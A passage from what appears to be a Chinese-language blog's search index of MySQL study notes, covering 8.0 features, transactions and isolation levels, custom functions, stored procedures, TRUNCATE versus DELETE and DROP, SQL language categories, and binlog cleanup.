SUM（）、COUNT（）这种分组聚合函数类似，在聚合函数后面加上over（）就变成窗口函数了，\n在括号里可以加上partition by等分组关键字指定如何分组，\n窗口函数即便分组也不会将多行查询结果合并为一行，而是将结果放回多行当中，即窗口函数不需要再使 GROUP BY. 示例 默认字符集由latin1变为utf8mb4 在8.0版本之前，默认字符集为latin1，utf8指向的是utf8mb3，\n8.0版本默认字符集为utf8mb4，utf8默认指向的也是utf8mb4。 MyISAM系统表全部换成InnoDB表 将系统表（mysql）和数据字典表全部改为InnoDB存储引擎，\n默认的MySQL实例将不包含MyISAM表，除非手动创建MyISAM表。 元数据存储变动 MySQL 8.0删除了之前版本的元数据文件，例如表结构.frm等文件，全部集中放入mysqlibd文件里。 自增变量持久化 在8.0之前的版本，自增主键 AUTO_INCREMENT 的值如果大于max（primary key）+1，\n在MySQL重启后，会重置AUTO_INCREMENT=max（primary key）+1，\n这种现象在某些情况下会导致业务主键冲突或者其他难以发现的问题。 注解 通俗点说, mysql不会记录已经被删除的主键, 比如有索引值: 1, 2, 3, 4, 5 删除了4和5, 重启后新增数据, 自增id会从 4 开始 而且如果手动把1, 更改为其他的比如6, 主键自增的当前最大值不会变,\n后面再插入的时候就可能报错;\nMysql8解决了这个问题, 会识别到最大自增id更新 自增主键重启重置的问题很早就被发现（ https://bugs.mysql.com/bug.php?id=199 ），\n一直到8.0才被解決，8.0版本将会对 AUTO_INCREMENT 值进行持久化，MySQL重启后，该值将不会改变。 innodb存储引擎select for update跳迹锁等待 对于 select … for share （8.0新增加查询共享锁的语法）或 select … for update ，\n在语句后面添加\nNOWAIT、\nSKIP LOCKED 语法可以跳过锁等待，或者跳过锁定。 NOWAIT, 报错返回 SKIP LOCKED, 返回结果不包含加锁行 注解 select … for update 表示查询的时候加一个排他锁 在5.7及之前的版本，select.for update，如果获取不到锁，会一直等待，直到innodb_lock_wait_timeout超时。 在8.0版本，通过添加nowait，skip locked语法，能够立即返回。\n如果查询的行已经加锁，那么nowait会立即报错返回，而skip locked也会立即返回，只是返回的结果中不包含被锁定的行。 应用场景比如查询余票记录，如果某些记录已经被锁定，用skip locked可以跳过被锁定的记录，只返回没有锁定的记录，提高系统性能。 新增innodb_dedicated_server自适应参数 能够让InnoDB根据服务器上检测到的内存大小自动配置innodb_buffer_pool_size, innodb_log_file_size等参数，\n会尽可能多的占用系统可占用资源提升性能。\n解决非专业人员安装数据库后默认初始化数据库参数默认值偏低的问题，\n前提是服务器是专用来给MySQL数据库的，如果还有其他软件或者资源或者多实例MySQL使用，不建议开启该参数，不然会影响其它程序。 默认是OFF关闭: show variables like '%innodb_dedicated_server%'; 死锁检查控制 MySQL 8.0 （MySQL 5.7.15）增加了一个新的动态变量 innodb_dgadlock_detect，\n用于控制系统是否执行 InnoDB死锁检查，默认是打开的。\n死锁检测会耗费数据库性能的，对于高并发的系统，我们可以关闭死锁检测功能，提高系统性能。 但是我们要确保系统极少情况会发生死锁，同时要将锁等待超时参数调小一点，以防出现死锁等待过久的情况。 默认打开的: show variables like '%innodb_deadlock_detect%' undo文件不再使用系统表空间 默认创建2个UNDO表空间，不再使用系统表空间。 binlog日志过期时间精确到秒 之前是天，并且参数名称发生变化. 在8.0版本之前，binlog日志过期时间设置都是设置expire_logs_days参数，\n而在8.0版本中，MySQL默认使用binlog_expire_logs_seconds参数。 DDL原子化 InnoDB表的DDL文持事务完整性，要么成功要么回滚。 MySQL 8.0开始支持原子DDL操作，其中与表相关的原子 DDL只支持 InnoDB 存储引擎。 一个原子 DDL 操作内容包括：更新数据字典，存储引擎层的操作，在 binlog 中记录 DDL 操作。 支持与表相关的DDL：数据库、表空间、表、索引的 CREATE、ALTER、DROP 以及 TRUNCATE TABLE。\n比如删除两个表, 即使t2报错, t1也会被成功删除: drop tables t1, t2; 支持的其它DDL：存储程序、触发器、视图、UDF 的 CREATE、DROP 以及ALTER语句。 支持账户管理相关的 DDL：用户和角色的 CREATE、ALTER、DROP 以及适用的 RENAME等等。 参数修改持久化 MySQL 8.0版本支持在线修改全局参数并持久化，通过加上PERSIST关键字，\n可以将修改的参数持久化到新的配置文件（mysqld-auto.cnf）中，\n重启MySQL时，可以从该配置文件获取到最新的配置参数。set global 设置的变量参数在mysq重启后会失效。 系统会在数据目录下生成一个包含json格式的mysqld-auto.cnf 的文件,\n当my.cnf 和mysqld-auto.cnf 同时存在时，后者具有更高优先级: set persist innodb_lock_wait_timeout=25;","tags":"数据库","url":"/yq-docs-database-mysql-8.0-new-features.html","loc":"/yq-docs-database-mysql-8.0-new-features.html"},{"title":"事务","text":"Mysql事务四大特性ACID A (Atomicity): 原子性;\n事务作为一个整体被执行，包含在其中的对数据库的操作要么全部被执行，要么都不执行; C (Consistency): 一致性;\n指在事务开始之前和事务结束以后，数据不会被破坏，假如 A 账户给B 账户转 10块钱，不管成功与否，A和B的总金额是不变的; I (Isolation): 隔离性;\n多个事务并发访问时，事务之间是相互隔离的，即一个事务不影响其它事务运行效果; D (Durability): 持久性\n表示事务完成以后，该事务对数据库所作的操作更改，将持久地保存在数据库之中. 实现原理 事务的隔离性是通过数据库锁以及MVCC机制实现的; 事务的一致性由undo log来保证：\nundo log是逻辑日志，记录了事务的insert、update、delete操作，\n回滚的时候做相反的delete、update、insert操作来恢复数据。 事务的原子性和持久性由redo log来保证：\nredo log被称作重做日志，是物理日志，事务提交的时候，\n必须先将事务的所有日志写入redo log持久化，到事务的提交操作才算完成。 事务隔离级别 读未提交 读未提交，采取的是读不加锁原理。允许脏读 事务读不加锁，不阻塞其他事务的读和写 事务写阻塞其他事务写，但不阻塞其他事务读； 读未提交隔离级别，只限制了两个数据不能同时修改，\n但是修改数据的时候，即使事务未提交，\n都是可以被别的事务读取到的，这级别的事务隔离有脏读、重复读、幻读的问题； 读已提交 读已提交隔离级别，当前事务只能读取到其他事务提交的数据，\n所以这种事务的隔离级别解决了脏读问题，但还是会存在重复读、幻读问题； 读取已提交和可重复读级别利用了ReadView和MVCC，\n也就是每个事务只能读取它能看到的版本（ReadView）。\n只能读取到已经提交的数据. READ COMMITTED：每次读取数据前都生成一个ReadView 可重复读(默认) 可重复读隔离级别，限制了读取数据的时候，不可以进行修改，\n所以解决了重复读的问题，但是读取范围数据的时候，是可以插入数据，所以还会存在幻读问题； 可重复读. 读取已提交和可重复读级别利用了ReadView和MVCC，\n也就是每个事务只能读取它能看到的版本（ReadView） REPEATABLE READ ：在事务里第一次读取数据时生成一个ReadView 串行化 事务最高的隔离级别，在该级别下，所有事务都是进行串行化顺序执行的。\n可以避免脏读、不可重复读与幻读所有并发问题。但是这种事务隔离级别下，事务执行很耗性能。 串行化的实现采用的是读写都加锁的原理。 串行化的情况下，对于同一行事务，写会加写锁，读会加读锁。\n当出现读写锁冲突的时候，后访问的事务必须等前一个事务执行完成，才能继续执行。 数据库是如何保证事务的隔离性的呢？ 数据库是通过加锁，来实现事务的隔离性的。 加锁确实好使，可以保证隔离性。\n比如串行化隔离级别就是加锁实现的。\n但是频繁的加锁，导致读数据时，没办法修改，修改数据时，没办法读取，大大降低了数据库性能。 那么，如何解决加锁后的性能问题的？\n答案就是,MVCC多版本并发控制！\n它实现读取数据不用加锁，可以让读取数据同时修改。修改数据时同时可读取。 参见: MVCC 参考: https://juejin.cn/post/7016165148020703246 并发带来事物问题 丢失更新 A事务提交或撤销时, 把B事务给丢了 脏读 如果一个事务读取到了另一个未提交事务修改过的数据，我们就称发生了脏读现象。 不可重复读 同一个事务内，前后多次读取，读取到的数据内容不一致(其他事务的修改已经提交) 幻读 如果一个事务先根据某些搜索条件查询出一些记录，\n在该事务未提交时，\n另一个事务写入了一些符合那些搜索条件的记录（如insert、delete、update），就意味着发生了幻读。 事务优化 优化原则 在保证业务逻辑的前提下, 尽量缩短事务长度 大事务拆分为小事务 DDL拆分(无锁变更) 长事务合并为大事务 长事务分解(不必要的请求擦除) 应用保持一致性","tags":"数据库","url":"/yq-docs-database-mysql-Affairs.html","loc":"/yq-docs-database-mysql-Affairs.html"},{"title":"自定义函数","text":"可能会遇到内置函数 函数API 满足不了使用场景的问题, 这时候自定义函数就有用了 自定义函数是一种与存储过程十分相似的过程式数据库对象。\n它与存储过程一样，都是由 SQL 语句和过程式语句组成的代码片段，并且可以被应用程序和其他 SQL 语句调用。 自定义函数与存储过程之间存在几点区别： 自定义函数不能拥有输出参数，这是因为自定义函数自身就是输出参数；而存储过程可以拥有输出参数。 自定义函数中必须包含一条 RETURN 语句，而这条特殊的 SQL 语句不允许包含于存储过程中。 可以直接对自定义函数进行调用而不需要使用 CALL 语句，而对存储过程的调用需要使用 CALL 语句。 创建 语法: CREATE FUNCTION <函数名> ( [ <参数1> <类型1> [ , <参数2> <类型2>] ] … )\nRETURNS <类型>\n<函数主体> 函数名: 应该合法的标识符，并且不应该与已有的关键字冲突, 包括已有函数名, 已有存储过程名称\n一个函数应该属于某数据库，可以使用 db_name.funciton_name 的形式执行当前函数所属数据库, 否则默认为当前数据库。 参数列表: 可以有一个或者多个函数参数，甚至是没有参数也是可以的。对于每个参数，由参数名和参数类型组成。 返回值: 指明返回值类类型 函数体: 自定义函数的函数体由多条可用的MySQL语句，流程控制，变量声明等语句构成。\n需要指明的是函数体中一定要含有return 返回语句。 注解 创建函数时, 若不指定库名, 会创建在当前库, 使用时也是 示例-无参函数: mysql> DROP FUNCTION IF EXISTS hello;\nQuery OK, 0 rows affected, 1 warning (0.00 sec)\n\nmysql> DELIMITER $$\nmysql> CREATE FUNCTION hello()\n    ->  RETURNS VARCHAR(255)\n    -> BEGIN\n    ->  RETURN 'Hello  world,i am mysql';\n    -> END $$\nQuery OK, 0 rows affected (0.11 sec)\n\nmysql> DELIMITER ;\nmysql> SELECT hello();\n+-------------------------+\n| hello()                 |\n+-------------------------+\n| Hello  world,i am mysql |\n+-------------------------+\n1 row in set (0.00 sec) 示例-含有参数的自定义函数: mysql> DELIMITER $$\nmysql> DROP FUNCTION IF EXISTS test.formatDate $$\nQuery OK, 0 rows affected, 1 warning (0.07 sec)\n\nmysql> CREATE FUNCTION   test.formatDate(fdate datetime)\n    ->  RETURNS VARCHAR(255)\n    -> BEGIN\n    ->  DECLARE x VARCHAR(255) DEFAULT '';\n    ->  SET x= date_format(fdate,'%Y年%m月%d日%h时%i分%s秒');\n    ->  RETURN x;\n    -> END $$\nQuery OK, 0 rows affected (0.11 sec)\n\nmysql> DELIMITER ;\nmysql> SELECT   formatDate(now());\n+----------------------------+\n| formatDate(now())          |\n+----------------------------+\n| 2014年11月21日03时41分21秒 |\n+----------------------------+\n1 row in set (0.18 sec) 查询自定义函数 查看数据库中存在哪些自定义函数: SHOW FUNCTION STATUS 若要查看数据库中某个具体的自定义函数: SHOW CREATE FUNCTION<函数名> 查看函数状态, 比如创建时间之类: SHOW FUCNTION STATUS LIKE '函数名' 其中<函数名>用于指定该自定义函数的名称。 修改自定义函数 修改函数相关特征: ALTER FUNCTION func_name [characteristic ...]\n\ncharacteristic:\n    COMMENT 'string'\n  | LANGUAGE SQL\n  | { CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA }\n  | SQL SECURITY { DEFINER | INVOKER } 上面这个语法结构是MySQL官方给出的，修改的内容可以包含SQL语句也可以不包含，\n既可以是读数据的SQL也可以是修改数据的SQL还有权限。\n此外在修改function的时候还需要注意你不能使用这个语句来修改函数的参数以及函数体，\n如果你想改变这些的话你就需要删除掉这个函数然后重新创建。 例子: mysql> SELECT hello();\n+-------------------------+\n| hello()                 |\n+-------------------------+\n| Hello  world,i am mysql |\n+-------------------------+\n1 row in set (0.00 sec)\n\nmysql> ALTER FUNCTION hello\n    ->\n    -> READS SQL DATA\n    -> COMMENT 'print  hello';\nQuery OK, 0 rows affected (0.23 sec)\n\nmysql>  SELECT SPECIFIC_NAME,SQL_DATA_ACCESS,\n    -> ROUTINE_COMMENT FROM information_schema.Routines\n    -> WHERE ROUTINE_NAME='hello';\n+---------------+-----------------+-----------------+\n| SPECIFIC_NAME | SQL_DATA_ACCESS | ROUTINE_COMMENT |\n+---------------+-----------------+-----------------+\n| hello         | READS SQL DATA  | print  hello    |\n+---------------+-----------------+-----------------+\n1 row in set (0.21 sec) 若要修改自定义函数的内容，则需要先删除该自定义函数，然后重新创建。 参考: MySQL之自定义函数 删除自定义函数 自定义函数被创建后，一直保存在数据库服务器上以供使用，直至被删除。\n删除自定义函数的方法与删除存储过程的方法基本一样，可以使用 DROP FUNCTION 语句来实现。 语法: DROP FUNCTION [ IF EXISTS ] <自定义函数名> 自定义函数相关语法及变量 变量声明 语法: DECLARE var_name[,...] type [DEFAULT value] 声明局部变量。要给变量提供一个默认值，请包含一个DEFAULT子句。\n值可以被指定为一个表达式，不需要为一个常数。\n如果没有DEFAULT子句，初始值为NULL。\n使用语序使用 set 和 select into语句为变量赋值: set var_name = ''; IF  条件语句 语法: IF search_conditionTHEN\n\nstatement_list\n\n[ELSEIF search_conditionTHENstatement_list]\n\n...\n\n[ELSE statement_list]\n\nENDIF; CASE语句 语法: CASE case_value\n\nWHEN when_valueTHENstatement_list\n\n[WHEN when_value THENstatement_list]\n\n...\n\n[ELSE statement_list]\n\nEND CASE; 循环语句 语法: While\n\n[begin_label:]WHILEsearch_conditionDO\n\nstatement_list\n\nEND WHILE [end_label]; 退出整个循环使用 leave, 相当于break 退出当前循环使用 iterate, 相当于 continue 通过退出的标签决定退出哪个循环。","tags":"数据库","url":"/yq-docs-database-mysql-Conceptual-foundation-Functional-definition.html","loc":"/yq-docs-database-mysql-Conceptual-foundation-Functional-definition.html"},{"title":"关键字","text":"注解 Mysql一般都不区分大小写, 比如 desc 和 DESC 是一致的 DELIMITER 表示定义一个结束符, 默认是分号; 当我们使用命令行来定义函数时候, 函数内部的语句往往需要分号表示结束;\n会与默认的分号冲突, 所以先定义一个其他的结束符, 再写函数; 如定义 // 为结束符: mysql> delimiter //\nmysql> CREATE FUNCTION `SHORTEN`(S VARCHAR(255), N INT)\nmysql>     RETURNS varchar(255)\nmysql> BEGIN\nmysql> IF ISNULL(S) THEN\nmysql>     RETURN '';\nmysql> ELSEIF N<15 THEN\nmysql>     RETURN LEFT(S, N);\nmysql> ELSE\nmysql>     IF CHAR_LENGTH(S) <=N THEN\nmysql>    RETURN S;\nmysql>     ELSE\nmysql>    RETURN CONCAT(LEFT(S, N-10), '...', RIGHT(S, 5));\nmysql>     END IF;\nmysql> END IF;\nmysql> END;// 另外, 用完后记得还原, 不然分号用不了: delimiter ; DESC DESCRIBE 的简写形式，用于获取表的结构信息。 DESC 或 DESCRIBE 命令用于检索指定表的列元数据，\n包括列名、数据类型、约束条件等。它提供了有关表的结构的详细信息，帮助您了解表的字段及其属性。 以下是使用 DESC 命令的一般语法: DESC $table_name; 其中，table_name 是要描述的表的名称。 返回一个结果集 Field：列名 Type：列的数据类型 Null：指示列是否允许 NULL 值 Key：指示列是否为主键或索引的一部分 Default：列的默认值 Extra：其他列属性，例如自动递增、注释等。 DELIMITER 定义分隔符 DEFAULT 可以用在, 当插入数据时, 不想手动写主键的值, 就可以给default.","tags":"数据库","url":"/yq-docs-database-mysql-Conceptual-foundation-Keyword.html","loc":"/yq-docs-database-mysql-Conceptual-foundation-Keyword.html"},{"title":"关键字-truncate","text":"truncate truncate使用语法 truncate的作用是清空表或者说是截断表，只能作用于表。\ntruncate的语法很简单，后面直接跟表名即可，例如: truncate table tbl_name 或者 truncate tbl_name 。 执行truncate语句需要拥有表的drop权限，从逻辑上讲，\ntruncate table类似于delete删除所有行的语句\n或 drop table 然后再 create table 语句的组合。 为了实现高性能，它绕过了删除数据的DML方法，因此，它不能回滚。\n尽管truncate table与delete相似，但它被分类为DDL语句而不是DML语句。 truncate与drop,delete的对比 上面说过truncate与delete，drop很相似，其实这三者还是与很大的不同的，下面简单对比下三者的异同。 truncate与drop是DDL语句，执行后无法回滚； delete是DML语句，可回滚。 truncate只能作用于表；delete，drop可作用于表、视图等。 truncate会清空表中的所有行，但表结构及其约束、索引等保持不变； drop会删除表的结构及其所依赖的约束、索引等。 truncate会重置表的自增值；delete不会。 truncate不会激活与表有关的删除触发器；delete可以。 truncate后会使表和索引所占用的空间会恢复到初始大小； delete操作不会减少表或索引所占用的空间，drop语句将表所占用的空间全释放掉。 truncate使用场景及注意事项 通过前面介绍，我们很容易得出truncate语句的使用场景，即该表数据完全不需要时可以用truncate。 如果想删除部分数据用delete，注意带上where子句； 如果想删除表，当然用drop； 如果想保留表而将所有数据删除且和事务无关，用truncate即可； 如果和事务有关，或者想触发trigger，还是用delete； 如果是整理表内部的碎片，可以用truncate然后再重新插入数据。 无论怎样，truncate表都是高危操作，特别是在生产环境要更加小心，下面列出几点注意事项，希望大家使用时可以做下参考。 truncate无法通过binlog回滚。 truncate会清空所有数据且执行速度很快。 truncate不能对有外键约束引用的表使用。 执行truncate需要drop权限，不建议给账号drop权限。 执行truncate前一定要再三检查确认，最好提前备份下表数据。","tags":"数据库","url":"/yq-docs-database-mysql-Conceptual-foundation-Keyword-Truncate.html","loc":"/yq-docs-database-mysql-Conceptual-foundation-Keyword-Truncate.html"},{"title":"SQL四种语言: DDL,DML,DCL,TCL","text":"参考: SQL四种语言：DDL,DML,DCL,TCL DDL(Data Definition Language) 数据库定义语言(statements are used to define the database structure or schema.) DDL是 SQL 语言的四大功能之一。 用于定义数据库的三级结构，\n包括外模式、概念模式、内模式及其相互之间的映像，定义数据的完整性、安全控制等约束 适用范围：对数据库中的某些对象(例如，database,table)进行管理，如: CREATE\nALTER\nDROP\nTRUNCATE\nCOMMENT\nRENAME 举例,\n创建数据库: create database IF NOT EXISTS hncu CHARACTER SET utf8; 创建表格: use hncu;\ncreate table IF NOT EXISTS stud(\nid int,\nname varchar(30),\nage int\n); 更改表结构(设置约束): desc stud; //查看表结构\nalter table stud drop column age;\nalter table stud add column age int; 删除表、删除数据库: drop table stud;\ndrop database hncu; DML(Data Manipulation Language) 数据操纵语言 (statements are used for managing data within schema objects.) 由DBMS提供，用于让用户或程序员使用，实现对数据库中数据的操作。 DML分成交互型DML和嵌入型DML两类。\n依据语言的级别，DML又可分成过程性DML和非过程性DML两种。 适用范围：对数据库中的数据进行一些简单操作，如: SELECT\nINSERT\nUPDATE\nDELETE\nMERGE\nCALL\nEXPLAIN PLAN\nLOCK TABLE 主要指数据的增删查改: Select/delete/update/insert/call select * from stud;\nselect name,age from stud; //查询指定的列\nselect name as 姓名, age as 年龄 from stud; DCL(Data Control Language) 数据库控制语言授权，角色控制等 GRANT 授权 REVOKE 取消授权 TCL(Transaction Control Language) 事务控制语言 SAVEPOINT 设置保存点 ROLLBACK 回滚 SET TRANSACTION SQL主要分成四部分 数据定义。（SQL DDL）用于定义SQL模式、基本表、视图和索引的创建和撤消操作。 数据操纵。（SQL DML）数据操纵分成数据查询和数据更新两类。数据更新又分成插入、删除、和修改三种操作。 数据控制。包括对基本表和视图的授权，完整性规则的描述，事务控制等内容。 嵌入式SQL的使用规定。涉及到SQL语句嵌入在宿主语言程序中使用的规则。","tags":"数据库","url":"/yq-docs-database-mysql-Conceptual-foundation-SQL-four-languages-DDL,-DML,-DCL,-TCL.html","loc":"/yq-docs-database-mysql-Conceptual-foundation-SQL-four-languages-DDL,-DML,-DCL,-TCL.html"},{"title":"存储过程","text":"MySQL5.0 版本开始支持存储过程。 如果在实现用户的某些需求时，需要编写一组复杂的SQL语句才能实现，\n那么我们就可以将这组复杂的SQL语句集提前编写在数据库中，\n由JDBC调用来执行这组SQL语句。\n把编写在数据库中的SQL语句集称为存储过程。 存储过程（PROCEDURE） 事先经过编译并存储在数据库中的一段SQL语句的集合。\n调用存储过程可以简化应用开发人员的很多工作，\n减少数据在数据库和应用服务器之间的传输，对于提高数据处理的效率是很有好处的 简单理解就是数据库 SQL 语言层面的代码封装与重用。\n类似于Java中的方法，需要先定义，使用时需要调用。\n存储过程可以定义参数，参数分为IN、OUT、INOUT类型三种类型 IN类型的参数表示接受调用者传入的数据； OUT类型的参数表示向调用者返回数据； INOUT类型的参数即可以接受调用者传入的参数，也可以向调用者返回数据。 优点 存储过程可封装，并隐藏复杂的商业逻辑。 存储过程可以回传值，并可以接受参数。 存储过程无法使用 SELECT 指令来运行，因为它是子程序，与查看表，数据表或用户定义函数不同。 存储过程可以用在数据检验，强制实行商业逻辑等。 缺点 存储过程，往往定制化于特定的数据库上，因为支持的编程语言不同。\n当切换到其他厂商的数据库系统时，需要重写原有的存储过程。 存储过程的性能调校与撰写，受限于各种数据库系统。 编写 基本语句格式: DELIMITER $$\n\nCREATE\n    /*[DEFINER = { user | CURRENT_USER }]*/\n    PROCEDURE 数据库名.存储过程名([in变量名 类型,out 参数 2，...])\n    /*LANGUAGE SQL\n    | [NOT] DETERMINISTIC\n    | { CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA }\n    | SQL SECURITY { DEFINER | INVOKER }\n    | COMMENT 'string'*/\n  BEGIN\n    [DECLARE 变量名 类型 [DEFAULT 值];]\n    存储过程的语句块;\n  END$$\n\nDELIMITER ; 存储过程中的语句必须包含在BEGIN和END之间 DECLARE中用来声明变量，变量默认赋值使用的DEFAULT，语句块中改变变量值，使用SET 变量=值； 存储位置 存储过程的信息都存储在 information_schema 数据库下的 Routines 表中，\n可以通过查询该表的记录来查询存储过程的信息，SQL 语句如下: SELECT * FROM information_schema.Routines WHERE ROUTINE_NAME=存储过程名; 参考: MySQL查看存储过程 调用 语法: CALL 数据库名.存储过程名(参数列表); 示例: DELIMITER $$\n\nCREATE\n    PROCEDURE `demo`.`demo2`(IN s_sex CHAR(1),OUT s_count INT)\n  -- 存储过程体\n  BEGIN\n    -- 把SQL中查询的结果通过INTO赋给变量\n    SELECT COUNT(*) INTO s_count FROM student WHERE sex= s_sex;\n    SELECT s_count;\n\n  END$$\nDELIMITER ; 调用这个存储过程: -- @s_count表示测试出输出的参数\nCALL demo2 ('男',@s_count); 存储过程管理 显示: SHOW PROCEDURE STATUS 显示特定数据库的存储过程: SHOW PROCEDURE STATUS WHERE db = 'db名字' AND NAME = 'name名字'; 显示特定模式的存储过程: SHOW PROCEDURE STATUS WHERE NAME LIKE '%mo%'; 显示存储过程的源码: SHOW CREATE PROCEDURE 存储过程名; 删除存储过程: DROP PROCEDURE 存储过程名; 流程控制语句 IF ELSE IF 语句包含多个条件判断，根据结果为 TRUE、FALSE执行语句，\n与编程语言中的 if、else if、else 语法类似: DELIMITER $$\nCREATE\n    PROCEDURE `demo`.`demo3`(IN `day` INT)\n  -- 存储过程体\n  BEGIN\n    IF `day` = 0 THEN\n    SELECT '星期天';\n    ELSEIF `day` = 1 THEN\n    SELECT '星期一';\n    ELSEIF `day` = 2 THEN\n    SELECT '星期二';\n    ELSE\n    SELECT '无效日期';\n    END IF;\n\n  END$$\nDELIMITER ; 条件控制语句 CASE 类似于Java的 switch() case ,\n不过Mysql中, 是 case xx when 类似IF的调用: DELIMITER $$\nCREATE\n    PROCEDURE demo4(IN num INT)\n  BEGIN\n    CASE -- 条件开始\n\n    WHEN num<0 THEN\n      SELECT '负数';\n    WHEN num>0 THEN\n      SELECT '正数';\n    ELSE\n    SELECT '不是正数也不是负数';\n\n    END CASE; -- 条件结束\n  END$$\nDELIMITER; 类似Java的switch调用: DELIMITER $$\nCREATE\n    PROCEDURE demo5(IN num INT)\n  BEGIN\n    CASE num  -- 条件开始\n    WHEN 1 THEN\n      SELECT '输入为1';\n    WHEN 0 THEN\n      SELECT '输入为0';\n    ELSE\n    SELECT '不是1也不是0';\n    END CASE; -- 条件结束\n  END$$\nDELIMITER; 循环语句 WHILE 类似于其他语言的while: DELIMITER $$\nCREATE\n    PROCEDURE demo6(IN num INT,OUT SUM INT)\n  BEGIN\n      SET SUM = 0;\n      WHILE num<10 DO -- 循环开始\n          SET num = num+1;\n          SET SUM = SUM+num;\n          END WHILE; -- 循环结束\n  END$$\nDELIMITER; 调用: -- 调用函数\nCALL demo6(0,@sum);\n\n-- 查询函数\nSELECT @sum; 循环语句 REPEAT UNTLL REPEATE…UNTLL 语句的用法和 Java中的 do…while 语句类似，\n都是先执行循环操作，再判断条件，\n区别是REPEATE 表达式值为 false时才执行循环操作，直到表达式值为 true停止: -- 创建过程\nDELIMITER $$\nCREATE\n    PROCEDURE demo7(IN num INT,OUT SUM INT)\n  BEGIN\n      SET SUM = 0;\n      REPEAT-- 循环开始\n    SET num = num+1;\n    SET SUM = SUM+num ;\n    UNTIL num>=10\n    END REPEAT; -- 循环结束\n  END$$\nDELIMITER; 调用: CALL demo7(9,@sum);\n\nSELECT @sum; 循环语句 LOOP 循环语句，用来重复执行某些语句。 执行过程中可使用 LEAVE语句或者ITEREATE来跳出循环，也可以嵌套IF等判断语句。 LEAVE 语句效果对于Java中的break，用来终止循环； ITERATE语句效果相当于Java中的continue，用来跳过此次循环。进入下一次循环。且ITERATE之下的语句将不在进行。 例如: DELIMITER $$\nCREATE\n    PROCEDURE demo8(IN num INT,OUT SUM INT)\n  BEGIN\n      SET SUM = 0;\n      demo_sum:LOOP-- 循环开始\n    SET num = num+1;\n    IF num > 10 THEN\n        LEAVE demo_sum; -- 结束此次循环\n    ELSEIF num <= 9 THEN\n        ITERATE demo_sum; -- 跳过此次循环\n    END IF;\n\n    SET SUM = SUM+num;\n    END LOOP demo_sum; -- 循环结束\n  END$$\nDELIMITER; 使用存储过程插入信息: DELIMITER $$\nCREATE\n    PROCEDURE demo9(IN s_student VARCHAR(10),IN s_sex CHAR(1),OUT s_result VARCHAR(20))\n  BEGIN\n    -- 声明一个变量 用来决定这个名字是否已经存在\n    DECLARE s_count INT DEFAULT 0;\n    -- 验证这么名字是否已经存在\n    SELECT COUNT(*) INTO s_count FROM student WHERE `name` = s_student;\n    IF s_count = 0 THEN\n          INSERT INTO student (`name`, sex) VALUES(s_student, s_sex);\n    SET s_result = '数据添加成功';\n    ELSE\n                SET s_result = '名字已存在，不能添加';\n                SELECT s_result;\n    END IF;\n  END$$\nDELIMITER; 参考: MySQL中的存储过程（详细篇） 更多详情: MySQL 存储过程","tags":"数据库","url":"/yq-docs-database-mysql-Conceptual-foundation-Stored-procedure.html","loc":"/yq-docs-database-mysql-Conceptual-foundation-Stored-procedure.html"},{"title":"binlog","text":"binlog是Mysql sever层维护的一种二进制日志，\n与innodb引擎中的redo/undo log是完全不同的日志； 其主要是用来记录对mysql数据更新或潜在发生更新的SQL语句，并以\"事务\"的形式保存在磁盘中； 作用主要有： 复制：MySQL Replication在Master端开启binlog，\nMaster把它的二进制日志传递给slaves并回放来达到master-slave数据一致的目的 数据恢复：通过mysqlbinlog工具恢复数据 增量备份 Binlog 包括两类文件： 二进制日志索引文件(.index)：记录所有的二进制文件。 二进制日志文件(.00000*)：记录所有 DDL 和 DML 语句事件。 redo log 保证一致性（将修改后的数据记录，当前语句） undo log 保证原子性（将修改前的数据记录，与当前语句相反的语句） binlog的清除/不记录 不记录 在 配置文件的 mysqld 下写入 skip-log-bin 清除 手动清理 ,\n查看主从库使用的是哪个binlog文件: show master status;\nshow slave status; 删除之前可以先做个备份 清除指定日期的备份: purge master logs before '2016-09-01 17:20:00'; //删除指定日期以前的日志索引中binlog日志文件 或者: purge master logs to'mysql-bin.000022'; //删除指定日志文件的日志索引中binlog日志文件 注解 使用该语法，会将对应的文件和mysql-bin.index中对应路径删除 时间和文件名一定不可以写错，尤其是时间中的年和文件名中的序号，\n以防不小心将正在使用的binlog删除！！！切勿删除正在使用的binlog reset master:将删除日志索引文件中记录的所有binlog文件，创建一个新的日志文件，起始值从000001开始。不要轻易使用该命令，这个命令通常仅仅用于第一次用于搭建主从关系的时的主库。 reset slave:清除master.info文件、relay-log.info文件，以及所有的relay log文件,并重新启用一个新的relaylog文件 自动清理 设置binlog过期时间，使系统自动删除binlog文件 在mysql中修改 ,\n查看binlog过期时间，这个值默认是0天，也就是说不自动清理，可以根据生产情况修改，本例修改为7天: mysql> show variables like 'expire_logs_days';\n+------------------------+-------+\n| Variable_name  | Value |\n+------------------------+-------+\n| expire_logs_days |   0  |\n+------------------------+-------+\nmysql> set global expire_logs_days = 7;    #设置binlog多少天过期 设置之后不会立即清除，触发条件是以下之一： binlog大小超过max_binlog_size，max_binlog_size默认为1G 手动执行flush logs 如果binlog非常多，不要轻易设置该参数，有可能导致IO争用，这个时候可以使用purge命令予以清除： 将bin.000055之前的binlog清掉: mysql>purge binary logs to 'bin.000055'; 将指定时间之前的binlog清掉: mysql>purge binary logs before '2017-05-01 13:09:51'; 配置文件中修改 mysqld在每个二进制日志名后面添加一个数字扩展名。\n每次你启动服务器或刷新日志时该数字则增加。\n如果当前日志大小达到max_binlog_size,还会自动创建新的二进制日志。\n如果你正使用大的事务，二进制日志还会超过max_binlog_size:事务全写入一个二进制日志中，绝对不要写入不同的二进制日志中。 expire_logs_days 定义了mysql清除过期日志的时间。默认值为0,表示\"没有自动删除\"。 max_binlog_size 二进制日志最大大小，如果二进制日志写入的内容超出给定值，日志就会发生滚动。\n你不能将该变量设置为大于1GB或小于4096字节。 默认值是1GB。 在my.cnf中添加配置,设置过期时间为30天: expire_logs_days = 30 max_binlog_size使用默认值即可 注解 过期时间设置的要适当，对于主从复制，要看从库的延迟决定过期时间，\n避免主库binlog还未传到从库便因过期而删除，导致主从不一致！！！","tags":"数据库","url":"/yq-docs-database-mysql-Conceptual-foundation-binlog.html","loc":"/yq-docs-database-mysql-Conceptual-foundation-binlog.html"},{"title":"触发器","text":"MySQL数据库中触发器是一个特殊的存储过程，\n不同的是执行存储过程要使用 CALL 语句来调用，\n而触发器的执行不需要使用 CALL 语句来调用，也不需要手工启动，\n只要一个预定义的事件发生就会被 MySQL自动调用。 引发触发器执行的事件一般如下： 增加一条学生记录时，会自动检查年龄是否符合范围要求。 